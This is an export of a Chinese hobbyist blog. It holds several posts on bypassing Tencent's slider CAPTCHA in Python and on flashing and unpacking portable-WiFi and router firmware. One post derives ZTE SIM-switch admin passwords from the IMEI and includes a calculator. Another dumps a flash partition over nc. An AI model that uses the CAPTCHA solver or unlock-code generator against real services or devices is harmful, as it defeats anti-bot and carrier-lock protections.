  hy_image_bytes = BytesIO(target_image)\n    image = Image.open(hy_image_bytes)\n\n    # 检查图像尺寸以确保裁剪操作不会超出边界\n    if image.size[0] < 255 or image.size[1] < 600:\n        raise ValueError(\"目标图像尺寸不足以进行裁剪操作。\")\n\n    # 裁剪图像\n    cropped_image = image.crop((145, 490, 255, 600))\n\n    # 保存裁剪后的图像为字节串\n    cropped_image_bytes = BytesIO()\n    cropped_image.save(cropped_image_bytes, format=\"PNG\")\n    cropped_image_bytes = cropped_image_bytes.getvalue()\n    # 执行图像匹配\n    ddres = det.slide_match(cropped_image_bytes, reference_image, simple_target=True)\n\n    # 返回匹配结果\n    return ddres[\"target\"][0]\n\n```\n\n图像匹配的问题解决 继续看下一个参数\n\n```json\npow_answer=2c4eae921213dcf2#290&pow_calc_time=50\n// 从第一个返回参数拿到\n\"pow_cfg\": {\n   \"prefix\": \"2c4eae921213dcf2#\",\n   \"md5\": \"ef7d702689e9682a8a6f93b695c6383b\"\n}\n```\n\n腾讯这边的pow算法为prefix#步数 计算MD5 匹配给出的md5\n\n这里 2c4eae921213dcf2#290 得到的MD5即为->ef7d702689e9682a8a6f93b695c6383b\n\n直接上代码\n\n```python\n// 注释由Ai生成\ndef pow_solve(prefix, pow_md5, timeout: float = 30.0):\n    \"\"\"\n    解决工作量证明问题。\n\n    参数:\n    - prefix: 字符串前缀，用于生成最终的答案。\n    - pow_md5: 目标MD5字符串，需要找到一个数字与前缀组合，其MD5值等于此目标字符串。\n    - timeout: 超时时间，以秒为单位，默认为30秒。\n\n    返回值:\n    - pow_answer: 解决工作量证明后的字符串答案，即前缀加上找到的数字。\n    - pow_calc_time: 计算工作量证明所花费的时间，以毫秒为单位，至少为50ms。\n    \"\"\"\n    # 初始化nonce为前缀的字符串形式，并将目标MD5转换为小写。\n    nonce = str(prefix).encode()\n    target = pow_md5.lower()\n    start = time()  # 记录开始时间。\n    cnt = 0  # 初始化计数器。\n    \n    # 在超时时间内循环，尝试不同的计数值直到找到匹配目标MD5的哈希值。\n    while time() - start < timeout:\n        if md5(nonce + str(cnt).encode()).hexdigest() == target:\n            print(\"PowMd5:\", target)\n            break\n        cnt += 1\n    \n    # 生成最终的答案字符串，并计算花费的时间（确保最低为50ms）。\n    pow_answer = prefix + str(cnt)\n    pow_calc_time = max(int((time() - start) * 1e3), 50)\n    \n    return pow_answer, pow_calc_time\n```\n\n{% note success %}\n\n至此参数准备完成\n\n\n{% endnote %}\n\n## 参考代码\n\n```python\n    async def TencentCAPTCHA(self) -> bool:\n        ua = base64.b64encode(user_agent.encode()).decode('utf-8')\n        callrandom = randint(10000, 99999)\n        callback = f\"_aq_{callrandom}\"\n        url = 'https://t.captcha.qq.com/cap_union_prehandle'\n        params = {\n            'aid': 2000000008, 'protocol': 'https',\n            'accver': 1, 'showtype': 'full',\n            'ua': ua, 'noheader': 1, 'fb': 1, 'aged': 0,\n            'enableAged': 0, 'enableDarkMode': 0,\n            'grayscale': 1, 'clientype': 2, 'userLanguage': 'zh-cn', 'cap_cd': '',\n            'uid': '', 'wxLang': '', 'lang': 'zh-cn', 'entry_url': '', 'elder_captcha': 0,\n            'js': '/tcaptcha-frame.114514.js',\n            'login_appid': '', 'wb': 1, 'subsid': 1,\n            'callback': callback, 'sess': '',\n        }\n        get_prehandle = await self.FetchData(url, method='GET', params=params, json=False)\n        allinfo = json.loads(get_prehandle.text[10:-1])\n        sess = allinfo['sess']\n        uip = allinfo['uip']\n        tdc_path = allinfo['data']['comm_captcha_cfg']['tdc_path']\n        pow_cfg = allinfo['data']['comm_captcha_cfg']['pow_cfg']['prefix']\n        pow_md5 = allinfo['data']['comm_captcha_cfg']['pow_cfg']['md5']\n        y_line = int(allinfo['data']['dyn_show_info']['fg_elem_list'][1]['init_pos'][1])\n        img_url = allinfo['data']['dyn_show_info']['bg_elem_cfg']['img_url']\n        sprite_url = allinfo['data']['dyn_show_info']['sprite_url']\n\n        url = f'https://t.captcha.qq.com{img_url}'\n        get_img = await self.FetchData(url, method='GET', json=False)\n        image_bytes = get_img.content\n        url = f'https://t.captcha.qq.com{sprite_url}'\n        get_img = await self.FetchData(url, method='GET', json=False)\n        target_image_bytes = get_img.content\n        x_line = cropmatch_imagem(image_bytes, target_image_bytes)\n        ans = f\"{x_line},{y_line}\"\n        xs, ys = imitate_drago(50, x_line, y_line)\n        mouse_track = list(zip(xs, ys))\n        url = f'https://t.captcha.qq.com{tdc_path}'\n        tdcjs = await self.FetchData(url, method='GET', json=False)\n        collect, eks = ChaosVM_Exm(tdcjs.text, uip, mouse_track)\n        print(\"Coordinate:\", ans)\n        url = \"https://t.captcha.qq.com/cap_union_new_verify\"\n        pow_answer, pow_calc_time = solve_workloado(pow_cfg, pow_md5)\n        ans = json.dumps([{\"elem_id\": 1, \"type\": \"DynAnswerType_POS\", \"data\": ans}]).replace(' ', '')\n        form_data = {\n            'collect': collect,\n            'tlg': len(collect),\n            'eks': eks,\n            'sess': sess,\n            'ans': ans,\n            'pow_answer': pow_answer,\n            'pow_calc_time': pow_calc_time\n        }\n        verify = await self.FetchData(url, method='POST', data=form_data)\n        print(\"Slider:\", verify)\n```\n\n- **FetchData为封装的httpx函数**\n\n{% note success no-icon %} \n### 致谢\n-----\n\n**鸽园:** https://zzsblog.top/tcaptcha.html\n\n**ddddocr项目:** https://github.com/sml2h3/ddddocr\n\n**pychaosvm项目:** https://github.com/aioqzone/pychaosvm\n\n\n{% endnote %}\n","tags":["Python"]},{"title":"5G CPE C8-660","url":"/shizuku/124648.html","content":"\n{% note warning %}\n**未完成的文章！**\n{% endnote %}\n\n\n![image-20231111125431585](https://img10.360buyimg.com/babel/jfs/t20251110/111423/33/38882/37682/654f096bF95fe39f7/075af9b009d9cdba.png)\n\n`http://192.168.66.1/cgi-bin/luci/admin/system/security`\n\n![image-20231111125746149](https://img10.360buyimg.com/babel/jfs/t20251110/164090/35/33810/2755/654f09cfF190709e4/8df1a65fac4b6c04.png)\n\n\n\n![image-20231111125845764](https://img10.360buyimg.com/babel/jfs/t20251110/110674/25/34566/171804/654f0abaF125b1959/c40d3bed617acfe2.png)\n\n\n\n![image-20231111130204718](https://img10.360buyimg.com/babel/jfs/t20251110/230275/11/2486/4728/654f0ad4Fb94c75cc/3186fef1d5b7a7d0.png)\n\n```\nroot@nradio:/tmp# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 08000000 00020000 \"spi0.0\"\nmtd1: 00100000 00020000 \"BL2\"\nmtd2: 00080000 00020000 \"u-boot-env\"\nmtd3: 00180000 00020000 \"factory\"\nmtd4: 00080000 00020000 \"bdinfo\"\nmtd5: 00200000 00020000 \"FIP\"\nmtd6: 04000000 00020000 \"ubi\"\n```\n\n./nc -l -p 3333 > bdinfo.bin\n\ncat /dev/mtd4 | nc 192.168.66.202 3333\n\n./nc -l -p 3333 > factory.bin\n\n```\nroot@nradio:/tmp# mtd erase u-boot-env\nUnlocking u-boot-env ...\nErasing u-boot-env ...\nroot@nradio:/tmp# mtd write /tmp/mt7981_nradio_c8-660-u-boot-web.fip FIP\nUnlocking FIP ...\n\nWriting from /tmp/mt7981_nradio_c8-660-u-boot-web.fip to FIP ...\nroot@nradio:/tmp#\nroot@nradio:/tmp# mtd write /tmp/immortalwrt-mediatek-mt7981-nradio_wt9103-squashfs-factory.bin ubi\nUnlocking ubi ...\n\nWriting from /tmp/immortalwrt-mediatek-mt7981-nradio_wt9103-squashfs-factory.bin to ubi ...\nroot@nradio:/tmp#\n```\n\n\n\n![image-20231111130922449](https://img10.360buyimg.com/babel/jfs/t20251110/179976/32/41178/5463/654f0c84Fa98a64df/626cb56c05e6d774.png)\n\n![image-20231111131202554](https://img10.360buyimg.com/babel/jfs/t20251110/198928/21/37771/33461/654f0d25F4ddbafd4/974dc5355b92b7a9.png)\n\n![image-20231111131209340](https://img10.360buyimg.com/babel/jfs/t20251110/96271/33/37008/46354/654f0d2cF2e804eaa/f492a58b8c0f8ad7.png)","tags":["Linux","高通","随身WIFI"]},{"title":"鲲鹏CC 开源固件","url":"/shizuku/060248.html","content":"\n# 鲲鹏CC 开源固件\n\n---\n\n## 硬件参数\n\n- **SOC: MT7628 300Mbps 2TR2**\n- **ROM: 8M / 16M 双版本**\n- **RAM: 64M / 128M 双版本**\n- **外围: 百兆单口 NanoSIM TypeC供电**\n- **LTE: 移远EC200A-CN (ASR方案)**\n  - **频段支持 1 3 5 8 34 38 39 40 41**\n- **SIM: 双贴片卡 联通 / 电信** \n\n## 官方界面\n\n![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/189963/39/29705/50489/649410dfF079eb5e3/eb1fef23f7601384.jpg)\n\n## 开启SSH\n\n**浏览器进入 http://192.168.66.1/cgi-bin/luci/admin/system/security**\n\n![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/123710/17/39754/21119/64941223F8ba78ff1/77eeab0aeb077da7.jpg)\n\n## U-Boot\n\n**刷入专用U-Boot (8M 16M 不通用 请注意)**\n\n{% note info no-icon %}\n\n**CC 8M版本 https://www.123pan.com/s/mh49-GBBwv 提取码:cc8m**\n\n\n{% endnote %}\n\n{% note success no-icon %}\n\n**CC 16M版本 https://www.123pan.com/s/mh49-5fBwv**\n\n\n{% endnote %}\n\n**下载电脑后** \n\n**使用SCP将下好的文件传入tmp目录 ssh连接路由器 用户名root 密码admin**\n\n**执行命令 `mtd -r write /tmp/uboot.bin u-boot` uboot.bin是你的文件名称 不要写错**\n\n![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/217470/32/29396/34506/64941464F7164dbba/d27747f2002e4304.jpg)\n\n**8M版本专用U-Boot**\n\n![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/127312/23/39794/28986/649904bfFd9b7c8f1/1482dd3896c3a39b.jpg)\n\n{% note danger no-icon %}\n\n**8M版本 无DHCP 需要电脑设置IP为192.168.1.2 255.255.255.0**\n\n\n{% endnote %}\n\n**切记 一定要备份编程器固件!**\n\n## OpenWRT固件\n\n**基于coolsnowwolf/lede(lean) 分支源码构建 支持TurboACC加速 移远模块控制**\n\n**支持IMEI修改 频段锁定 Kernel5.4 密码password  MuslC**\n\n{% note warning %}\n\n**仅适用于16M版本**\n\n\n{% endnote %}\n\n![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/117215/24/35446/23379/64941934F2253925f/03b40cc003920451.jpg)\n\n![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/130929/25/36497/23158/64941ae2F17e4a0cc/8171db056822145c.jpg)\n\n{% note info no-icon %}\n\n**DTS已提交至主线 型号 NRadio WT6286**\n\n**下载地址: https://www.123pan.com/s/mh49-6fBwv 提取码:open**\n\n\n{% endnote %}\n\n----\n\n## Q-WRT固件\n\n**基于Q-WRT源码编译 Kernel 4.4 密码admin WiFi稳定 系统轻快**\n\n**支持IMEI修改 频段锁定 GlibC**\n\n{% note warning %}\n\n**仅适用于16M版本**\n\n\n{% endnote %}\n\n![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/221413/23/30622/22750/6494172bFcae62c48/d71b9e1125560d56.jpg)\n\n![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/145632/12/35783/23616/64941782Fb22e1513/1df0214577f7d2b5.jpg)\n\n{% note info no-icon %}\n\n**下载地址: https://www.123pan.com/s/mh49-qfBwv 提取码:qwrt**\n\n{% endnote %}\n\n----\n\n## QWRT_8M版本\n\n{% note success %}\n\n**适用于8M_64M CC设备**\n\n\n{% endnote %}\n\n![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/212462/31/33608/35481/649902e8F7b8dc54f/1f02a3b9eb2012ac.jpg)\n\n{% note info no-icon %}\n\n**默认语言英文 自行切换即可 密码admin 4.4内核 全闭源驱动**\n\n**下载地址 https://www.123pan.com/s/mh49-YBBwv 提取码:cc8m**\n\n\n{% endnote %}\n\n----\n\n## 致谢\n\n{% note primary no-icon %}\n\n**鲲鹏无限 @NRadio 张导提供开发样机**\n**@暗云 提供QWRT编译支持**\n**@竹小霜 提供开发帮助建议**\n**@1021643421 提供活动信息**\n\n**以上排名不分先后顺序**\n{% endnote %}","tags":["随身WIFI"]},{"title":"TZ103系列 算法分析","url":"/shizuku/064401.html","content":"\n## 特别警告\n\n{% note warning %}\n\n**文章仅供学习参考，严禁非法使用，如非法使用，而导致的一切后果，由使用者自行承担。**\n\n{% endnote %}\n\n----\n\n## 算法分析\n\n**ZTE系列 WEB交互是由goahead程序负责**\n\n**使用编程器提取固件 解包 提取程序 (解包教程可以参考上一篇文章)**\n\n**使用IDA分析程序 使用Shift+F12 进入字符串模式 Alt+T搜索 sim select 等字样**\n\n![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/94495/10/27626/122888/6493fff8F12adebb0/d624cd70c6ed6162.jpg)\n\n**定位进入** \n\n```text\n.text:00015CF8                 PUSH.W          {R4-R11,LR}\n.text:00015CFC                 SUB             SP, SP, #0x24\n.text:00015CFE                 ADD.W           R10, SP, #0x48+s\n.text:00015D02                 ADD             R4, SP, #0x48+var_44\n.text:00015D04                 MOV             R5, R0\n.text:00015D06                 MOVS            R1, #0  ; c\n.text:00015D08                 MOVS            R2, #0x10 ; n\n.text:00015D0A                 MOV             R0, R10 ; s\n.text:00015D0C                 LDR             R6, =(byte_2A19B - 0x15D1C)\n.text:00015D0E                 BLX             memset\n.text:00015D12                 MOVS            R1, #0  ; c\n.text:00015D14                 MOVS            R2, #0xA ; n\n.text:00015D16                 MOV             R0, R4  ; s\n.text:00015D18                 ADD             R6, PC  ; byte_2A19B\n.text:00015D1A                 BLX             memset\n.text:00015D1E                 LDR             R1, =(aSimSelect - 0x15D28) ; \"sim_select\"\n.text:00015D20                 MOV             R2, R6\n.text:00015D22                 MOV             R0, R5\n.text:00015D24                 ADD             R1, PC  ; \"sim_select\"\n.text:00015D26                 BL              sub_DCE8\n.text:00015D2A                 MOV             R8, R0\n.text:00015D2C                 LDR             R0, =(aAlkSimSelectSi - 0x15D34) ; \"alk_sim_select:sim_select->%s\\n\"\n.text:00015D2E                 MOV             R1, R8\n.text:00015D30                 ADD             R0, PC  ; \"alk_sim_select:sim_select->%s\\n\"\n.text:00015D32                 BLX             printf\n.text:00015D36                 LDR             R1, =(aAdminPwd - 0x15D40) ; \"admin_pwd\"\n.text:00015D38                 MOV             R0, R5\n.text:00015D3A                 MOV             R2, R6\n.text:00015D3C                 ADD             R1, PC  ; \"admin_pwd\"\n.text:00015D3E                 BL              sub_DCE8\n.text:00015D42                 MOV             R9, R0\n.text:00015D44                 LDR             R0, =(aAlkSimSelectAd - 0x15D4C) ; \"alk_sim_select:admin_pwd->%s\\n\"\n.text:00015D46                 MOV             R1, R9\n.text:00015D48                 ADD             R0, PC  ; \"alk_sim_select:admin_pwd->%s\\n\"\n.text:00015D4A                 BLX             printf\n.text:00015D4E                 CMP.W           R8, #0\n.text:00015D52                 BNE             loc_15D64\n.text:00015D54                 LDR             R0, =(aAlkSimSelectEm - 0x15D5A) ; \"alk_sim_select:empty!\\n\"\n.text:00015D56                 ADD             R0, PC  ; \"alk_sim_select:empty!\\n\"\n.text:00015D58                 BLX             printf\n.text:00015D5C                 LDR             R1, =(aFailure - 0x15D64) ; \"failure\"\n.text:00015D5E                 MOV             R0, R5\n.text:00015D60                 ADD             R1, PC  ; \"failure\"\n.text:00015D62                 B               loc_15E66\n.text:00015D64 ; ---------------------------------------------------------------------------\n```\n\n**选定Push Alt+P Create Function 再F5转伪C**\n\n```c\n// 这里只粘贴了部分关键代码\nif (++v8 == 15) {\n    sprintf(v15, \"%c%c\", (unsigned __int8) s[3], (unsigned __int8) s[6]); \t\n    // 取IMEI 4位/7位 拼接\n    printf(\"[%s]:admin_code %s\\n\", \"alk_sim_select\", v15);\n    v9 = atoi(v15) + 125; \t\t\t\t\t\t\t\t\t\t\t\t\t\n    // v15 与 125 相加\n    memset(v15, 0, 0xA u);\n    sub_15C9C(v15, (int) s, 15); \t\t\t\t\t\t\t\t\t\t\t\n    // 调用sub_15C9C方法计算\n    v10 = 4 * (atoi(v15) + v9);\t\t\t\t\t\t\t\t\t\t\t\t\n    // 得到sub_15C9C计算结果与v9相加 再*4 得到密码\n    printf(\"[%s]:pwd_code %d\\n\", \"alk_sim_select\", v10);\n    memset(v15, 0, 0xA u);\n    sprintf(v15, \"%d\", v10);\n    if (strlen(v3) && !strcmp(v3, v15)) {\n        v11 = cfg_set( & unk_2D55D, v2);\n        cfg_save(v11);\n        cfg_set(\"switch_sim_flag\", \"1\");\n        v12 = strcmp(v2, \"1\");\n        if (v12) {\n            v12 = 0;\n            v13 = \"AT+ZCARDSWITCH=3\\r\\n\";\n        } else {\n            v13 = \"AT+ZCARDSWITCH=0\\r\\n\";\n        }\n        get_modem_info(v13, v12, v12);\n        sleep(1 u);\n        v4 = a1;\n        v5 = \"success\";\n    } else {\n        printf(\"alk_sim_select:wrong pwd!\\n\");\n        v4 = a1;\n        v5 = \"failure\";\n    }\n    return sub_1B0E4(v4, v5);\n}\n}\n```\n\n```c\n// sub_15C9C 方法\nint __fastcall sub_15C9C(char *a1, int a2, int a3)\n{\n  char v6; // r3\n  char s[36]; // [sp+4h] [bp-24h] BYREF\n\n  memset(s, 0, 0xAu);\n  strcpy(s, (const char *)(a3 - 6 + a2));  \n    // 取末尾6位\n  v6 = s[1];\n  s[1] = s[2];\n  s[2] = v6;\t\t\t\t\t\t\t\t\n    // 交换取值2-3位\n  sprintf(a1, \"%s\", s);\n  return printf(\"[%s] generate pwd %s\\n\", \"alk_generate_password\", a1);\n}\n```\n\n----\n\n## 算法转写\n\n```python\n# Python版本\nimei = \"123456789012345\"\na = imei[3] + imei[6]  # 47 =  4 + 7\nb = int(a) + 0x7d  # 172 = 47 + 125\nc = imei[-6:]  # 012345\nd = c[0x0] + c[0x2] + c[0x1] + c[-3:]  # 021345\nf = int(d) + b  # 021345 + 172\ne = 0x4 * f  # 4  * 021517\nprint(e) # 86068\n\n# 一句话版本\n4 * (int(imei[-6:][0] + imei[-6:][2] + imei[-6:][1] + imei[-6:][-3:]) + (int(imei[3] + imei[6]) + 125))\n```\n\n```javascript\n// Javascript版本\nconst imei = \"123456789012345\";\nconsole.log(4 * (parseInt(imei.slice(-6)[0x0] + imei.slice(-6)[0x2] + imei.slice(-6)[0x1] + imei.slice(-6).slice(-3)) + (parseInt(imei[3] + imei[6]) + 0x7d)))\n```\n\n---\n\n## 在线计算\n\n{% note success no-icon %}\n<div class=\"input-container\">\n  <input type=\"text\" id=\"imeiInput\" maxlength=\"15\" placeholder=\"请输入15位 IMEI\" class=\"custom-input\" />\n  <button onclick=\"calculate()\" class=\"custom-button\">计算</button>\n<button id=\"result\" class=\"result-container custom-button\" onclick=\"copyResult()\" style=\"display: none;\">\n<span id=\"resultIcon\"><i class=\"fas fa-paste\"></i></span>\n<span id=\"resultText\">结果</span>\n</button>\n\n\n\n</div>\n{% endnote %}\n\n\n\n<script>\nfunction calculate() {\n  var imei = document.getElementById(\"imeiInput\").value;\n  var a = imei[3] + imei[6];\n  var b = parseInt(a) + 0x7d;\n  var c = imei.slice(-6);\n  var d = c[0] + c[2] + c[1] + c.slice(-3);\n  var e = 4 * (parseInt(d) + b);\n  var resultText = document.getElementById(\"resultText\");\n  var resultButton = document.getElementById(\"result\");\n  resultText.innerText = \"密码: \" + e;\n  resultButton.style.display = \"inline-block\"; // 显示按钮\n}\n\nfunction copyResult() {\n  var resultButton = document.getElementById(\"result\");\n  var resultText = resultButton.innerText.replace(\"密码: \", \"\"); // 提取结果文本\n\n  navigator.clipboard.writeText(resultText)\n    .then(function() {\n      alert(\"结果已复制到剪贴板！\");\n    })\n    .catch(function(error) {\n      console.error(\"复制失败：\", error);\n    });\n}\n</script>\n","tags":["Linux","随身WIFI"]},{"title":"ZTE固件解包与打包","url":"/shizuku/063328.html","content":"\n# ZTE固件解包与打包\n\n{% note danger no-icon %}\n\n**本文章系个人为了学习和研究软件内含的设计思想和原理**\n\n**该文章适用于8M系列 ZTE固件 16M略有不同**\n\n{% endnote %}\n\n----\n\n## 固件提取\n\n**使用Flash编程器提取 例如 CH341A XTW100等 (个人推荐XTW系列)**\n\n**![image-20230614153826317](https://img14.360buyimg.com/ddimg/jfs/t1/120924/11/34007/145609/648c5723Fe0009d0e/4c4a6bbd06eb6893.jpg)**\n\n----\n\n## 固件分析\n\n**使用Binwalk分析固件**\n\n![image-20230528145411843](https://img14.360buyimg.com/ddimg/jfs/t1/216370/38/30465/100479/6472fac6F03eaa276/899a05eb48e90224.jpg)\n\n- 偏移地址：4882432 (0x4A8000)\n\n- 文件系统类型：Squashfs\n\n- 字节序：Little endian\n\n- 版本：4.0\n\n- 压缩方式：xz\n\n- 文件系统大小：2971894字节\n\n- inode数量：668\n\n- 块大小：262144字节\n\n----\n\n## 固件解包\n\n```shell\ndd if=YEBEI_TDD_8M.bin of=squashfs_image.sqfs bs=1 skip=4882432 count=2971894\n```\n\n**使用dd命令将其中的Squashfs分区提取**\n\n**安装 `squashfs-tools`**\n\n**使用`unsquashfs squashfs_image.sqfs`解包固件 得到以下文件列表**\n\n![image-20230622152143002](https://img11.360buyimg.com/ddimg/jfs/t1/198237/26/36666/64711/6493f6daF8c3e2b06/40d178f53451f46c.jpg)\n\n\n\n----\n\n## 固件打包\n\n**使用如下命令打包固件**\n\n![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/179721/9/34894/33613/6493f830Fb9ae5638/5d5e58fd48417a26.jpg)\n\n\n```shell\nmksquashfs squashfs-root/ new_squashfs_image.sqfs -comp xz -noappend -b 262144 -no-xattrs -always-use-fragments -all-root\n```\n{% note info no-icon %}\n\n- **squashfs-root/ 是你解包的目录 262144是blocksize 参考上面的binwalk参数修改**\n\n- **-no-xattrs -always-use-fragments -all-root 为辅助参数 参考图上unsquashfs解析结果**\n\n- **得到新文件new_squashfs_image.sqfs**\n\n{% endnote %}\n\n\n```shell\ndd if=new_squashfs_image.sqfs of=YEBEI_TDD_8M.bin bs=1 seek=4882432 conv=notrunc\n```\n\n{% note info no-icon %}\n\n- **seek=4882432 参考binwalk分析结果**\n\n{% endnote %}\n\n-----\n\n{% note success no-icon %}\n\n**这时就可以使用编程器刷入修改后的固件 建议刷入后恢复一次出厂设置 确保nv参数生效**\n\n**切记 任何操作前请备份原始固件**\n\n{% endnote %}\n\n## 郑重警告\n\n{% note warning %}\n\n**本人所写文章仅供学习参考，严禁非法使用，如非法使用，而导致的一切后果，由使用者自负。**\n\n\n{% endnote %}\n","tags":["Linux","随身WIFI"]},{"title":"中兴微 R1869系列补丁","url":"/shizuku/052827.html","content":"# 中兴微 R1869系列补丁 V1.1\n## 使用方法\n\n随身WiFi通过USB连接到电脑\n\n确保后台能打开 默认IP为 `192.168.0.1` 如果你是新讯款如`192.168.100.1`请自行修改\n\n密码默认`admin` 并不推荐修改 \n\n点击登录 点击补丁 完成\n\n{% note info no-icon %}\n\n**反解模式适用于小飞碟等已经被云控红灯的设备** \n\n\n{% endnote %}\n\n{% note danger no-icon %}\n**反解模式 请确保电脑已经关闭防火墙且插入SIM卡**\n{% endnote %}\n\n{% note warning no-icon %}\n\n**Upx压缩打包 存在报毒可能 软件安全无毒 如遇误报请放行**\n\n\n{% endnote %}\n\n\n ![image-20230521224908497](https://img14.360buyimg.com/ddimg/jfs/t1/117443/15/39434/11911/646a2f64F4d246125/a7e7439748e3b054.jpg)\n\n![image-20230521224002401](https://img14.360buyimg.com/ddimg/jfs/t1/114835/11/34653/7331/646a2d42F5ea94363/c0bc3956e13f9350.jpg)\n\n![image-20230521225722010](https://img14.360buyimg.com/ddimg/jfs/t1/199638/16/35169/12805/646a3152F7a1f3901/3cb31916ee3391e0.jpg)\n\n\n\n{% note success no-icon %}\n\n**适用于 MU917-A02(小飞碟) R1869Y_A01(口红) R1869X_A10(新讯) 等R1869系列**\n\n\n{% endnote %}\n\n----\n\n## 下载地址\n\n{% note info no-icon %}\n~~下载地址: https://www.123pan.com/s/mh49-R9Bwv ~~\n~~提取码: 0721~~\n{% endnote %}\n\n# 1.1 版本更新\n\n![image-20230616203734524](https://img14.360buyimg.com/ddimg/jfs/t1/116880/23/38821/16923/648c578fF8162bcac/aa577dd29f0363f5.jpg)\n\n{% note info no-icon %}\n\n**兼容ZDX随身WiFi**\n\n- **(补丁后LED失效)**\n\n**支持在线参数解析 以后不需要再下载软件了 在线获取补丁配置**\n\n{% endnote %}\n\n{% note success no-icon %}\n**下载地址: https://www.123pan.com/s/mh49-bxBwv**\n{% endnote %}","tags":["随身WIFI"]},{"title":"GT106 Debian固件","url":"/shizuku/051919.html","content":"\n# GT106 Debian固件\n\n![image-20230512134729604](https://img14.360buyimg.com/ddimg/jfs/t1/119100/10/36852/45049/645dd2f1F024ad55c/ae15d421b22796ea.jpg)\n\n## 配置\n\n{% note info no-icon %}\n- **SOC: MSM8916 Qualcomm410**\n\n- **EMCP: 512M+4G**\n\n- **GT106模组 Band1/3/5** \n\n- **电池: 8000mAh 4.2V**\n\n- **TypeC + USB_A**\n\n- **英集芯IP5306**\n\n- **内置贴片卡 / nanoSim**\n\n{% endnote %}\n\n## 拆解\n\n![image-20230512153943449](https://img14.360buyimg.com/ddimg/jfs/t1/50997/12/21378/78128/645ded40F67602b73/28f7d8344a1b0762.jpg)\n\n![image-20230512153956922](https://img14.360buyimg.com/ddimg/jfs/t1/4009/40/22394/62220/645ded4dFe73fdf55/b8bab2e0faa2ad62.jpg)\n\n## 备份\n\n{% note info no-icon %}\n\n**原厂9008备份 eMMC全量**\n**下载地址: https://www.123pan.com/s/mh49-yTBwv**\n**提取码:0721**\n\n{% endnote %}\n\n----\n\n## 定义\n\n```text\nLED\nGreen 1 GPIO 0x13 19\nGreen 2 GPIO 0x08 8\nRed 1 GPIO 0x09 9\n---\nWiFi\nGreen 3 GPIO 0x12 18\n---\nSIM\neSIM GPIO 0x00 0\nSIM GPIO 0x01 1\n```\n\n### 测试点定义 \n\n**有一个点找不到位置???**\n\n![image-20230512155807726](https://img14.360buyimg.com/ddimg/jfs/t1/216505/7/27368/138263/645df190F325bcb43/010a8e86adc1716a.jpg)\n\n### 引脚定义\n\n![GT106_PIN](https://img14.360buyimg.com/ddimg/jfs/t1/204830/10/32498/177886/645df199F50b7dfc6/64219eb7d0fcc6ac.jpg)\n\n{% note danger no-icon %}\n\n**结合GT106模块 高通官方文档SOC引脚定义 PMIC SOC定义**\n**拆SOC打点得到 不保证100%准确性 转载请著名**\n\n{% endnote %}\n\n----\n\n## 固件\n\n**基于HandsomeHacker Kernel 5.15 Debian 11 bullseye制作**\n\n- **基带工作正常**\n\n- **WiFi工作正常**\n\n- **LED工作正常**\n\n- **按键工作正常**\n\n- **默认外置卡**\n\n{% note warning no-icon %}\n\n**使用说明:**\n\n此系统仅适用于GT106主板 (抖音9.9元充电宝随身WiFi)\n使用adb命令进入9008模式 `adb reboot edl`\n使用 Qualcomm Premium Tool 擦除设备的aboot boot分区\n将压缩包内的 `aboot.bin` 刷入`aboot`分区\n\n{% endnote %}\n\n{% note danger no-icon %}\n\n如果你拆开设备了 请断开电池 裸板刷机 做完上一步操作 \n直接拔电再插上 会出现BootLoader设备 执行flash.bat即可\n\n----\n如果你没有拆开设备 请捅RST孔+电源同时摁着 直到设备重启 \n出现BootLoader设备 执行flash.bat即可\n\n\n{% endnote %}\n\n{% note success no-icon %}\n\n基带工作正常 默认无需推送modem文件 即可使用外置卡\n查询命令 `mmcli -m 0`\n\n本固件无自带WiFi热点 开机插入电脑后模式为 `ADB+RNDIS`\n(Win11下ADB概率不可用 请使用RNDIS配置)\n\n固件默认用户名`root`  密码 `admin`\n\n**按键逻辑** \n- 侧面小孔RST 为**重启**按键 点一下系统重启(复位重启) \n- 电源键 **单击**为IP5036激活(电池灯亮) 关机状态下 **长按开机** 开机后 **双击按键关机**(IP5306停止输出)\n\nBootloder模式 关机状态 按着RST 再长按电源开机 进入Bootloder模式\n9008模式 进入Bootloder模式 输入指令`fastboot oem reboot-edl`进入\n\n**LED**\n红色为系统灯 WIFI绿色为网络灯 可自行配置\n\n系统语言 ZH_CN UTF-8 使用USTC源\n{% endnote %}\n\n{% note danger %}\n**先备份! 全量备份 分区备份 QCN备份 总之一定要备份!**\n{% endnote %}\n{% note danger %}\n**先备份! 全量备份 分区备份 QCN备份 总之一定要备份!**\n{% endnote %}\n{% note danger %}\n**先备份! 全量备份 分区备份 QCN备份 总之一定要备份!**\n{% endnote %}\n{% note info no-icon %}\n**看完使用说明再下载!**\n下载地址: https://www.123pan.com/s/mh49-K3Bwv\n提取码: 0721 解压密码 `momoe`\n{% endnote %}\n\n![image-20230512164802314](https://img14.360buyimg.com/ddimg/jfs/t1/219147/20/25481/35905/645dfd41F00c4a94e/ed8493509070d3ac.jpg)\n\n---\n![box-4](https://img14.360buyimg.com/ddimg/jfs/t1/144798/2/36404/66423/645df668Fdc781e45/602b6edb31f364b5.jpg)\n\n----\n\n## 致谢\n\n![thank1](https://img14.360buyimg.com/ddimg/jfs/t1/94421/27/38258/95481/645e03ccFb5666865/a2d049a1b5743fff.jpg)\n\n**以上排名不分先后**\n","tags":["Linux","Debian"]},{"title":"随身WIFI 口红 WIFI6","url":"/shizuku/053430.html","content":"\n\n\n# 随身WiFi 口红款\n\n## 开箱\n\n![image-20230503162133661](https://img14.360buyimg.com/ddimg/jfs/t1/191455/2/33586/37814/6452198eF484c08b0/d4b880b0e8c8168d.jpg)\n\n![image-20230503162152416](https://img14.360buyimg.com/ddimg/jfs/t1/61800/33/25972/37908/645219a0Fb4b6ac40/d1c67d80ddd1c246.jpg)\n\n**整体采用塑料材质 口红造型 外壳可以抽开 MicroUSB接口 质感尚可 体积不错**\n\n----\n\n## 